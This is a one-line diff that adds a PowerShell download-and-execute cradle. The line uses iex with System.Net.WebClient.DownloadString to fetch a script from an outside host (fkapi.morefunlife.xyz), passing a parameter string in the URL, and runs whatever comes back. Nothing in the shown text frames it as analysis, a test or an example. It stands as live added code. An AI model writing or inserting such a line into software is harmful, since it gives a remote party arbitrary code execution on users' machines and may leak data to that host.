@@ -1,0 +1,1 @@
+iex(New-Object System.Net.WebClient).DownloadString("https://fkapi.morefunlife.xyz/api/init0.fk?{0}" -f $param_whole_str);
